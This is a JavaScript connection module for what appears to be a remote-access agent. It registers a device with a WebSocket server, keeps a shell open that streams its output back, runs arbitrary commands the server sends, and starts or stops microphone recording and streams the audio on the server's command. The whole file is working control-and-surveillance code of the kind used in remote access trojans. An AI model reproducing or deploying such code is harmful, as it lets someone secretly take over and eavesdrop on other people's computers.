import WebSocket from "ws";
import { getAgentId } from "./identity.js";
import { getDeviceInfo } from "./device.js";
import { startMicrophone, stopMicrophone } from "./microphone.js";
import { startShell, executeCommand, stopShell } from "./command.js";
import config from "./config.js";
const SERVER_URL = config.server;
// const SERVER_URL = "ws://localhost:3000/agent";
let socket = null;
let reconnectDelay = 2000;
const agentId = getAgentId();
async function handleCommand(message) {
    switch (message.type) {
        case "microphone_start":
            startMicrophone((chunk) => {
                if (socket &&
                    socket.readyState === WebSocket.OPEN) {
                    socket.send(chunk);
                }
            });
            break;
        case "microphone_stop":
            stopMicrophone();
            break;
        case "command_execute": {
            const command = message.command;
            if (typeof command !== "string" ||
                command.trim() === "") {
                return;
            }
            try {
                executeCommand(command);
            }
            catch (error) {
                console.error("Command execution failed:", error);
            }
            break;
        }
    }
}
export function connect() {
    console.log("Connecting to server...");
    socket = new WebSocket(SERVER_URL);
    socket.on("open", () => {
        console.log("Connected to server");
        reconnectDelay = 2000;
        const deviceInfo = getDeviceInfo();
        const registrationMessage = {
            type: "agent_register",
            agentId,
            ...deviceInfo,
            agentVersion: config.agentVersion
        };
        startShell((type, data) => {
            if (socket &&
                socket.readyState === WebSocket.OPEN) {
                socket.send(JSON.stringify({
                    type: "terminal_output",
                    stream: type,
                    data
                }));
            }
        });
        console.log("Sending registration:", registrationMessage);
        socket?.send(JSON.stringify(registrationMessage));
    });
    socket.on("message", (data, isBinary) => {
        // console.log(
        //     `Message from server: ${isBinary
        //         ? `binary ${data.length} bytes`
        //         : data.toString()
        //     }`
        // );
        if (isBinary) {
            return;
        }
        try {
            const message = JSON.parse(data.toString());
            console.log("Server:", message);
            handleCommand(message);
        }
        catch (error) {
            console.error("Invalid server message:", error);
        }
    });
    socket.on("close", (code, reason) => {
        console.log(`Connection closed. Code: ${code}, Reason: ${reason.toString()}`);
        stopShell();
        socket = null;
        setTimeout(() => {
            connect();
        }, reconnectDelay);
        reconnectDelay = Math.min(reconnectDelay * 2, 30000);
    });
    socket.on("error", (error) => {
        console.error("WebSocket error:", error);
    });
}
//# sourceMappingURL=connection.js.map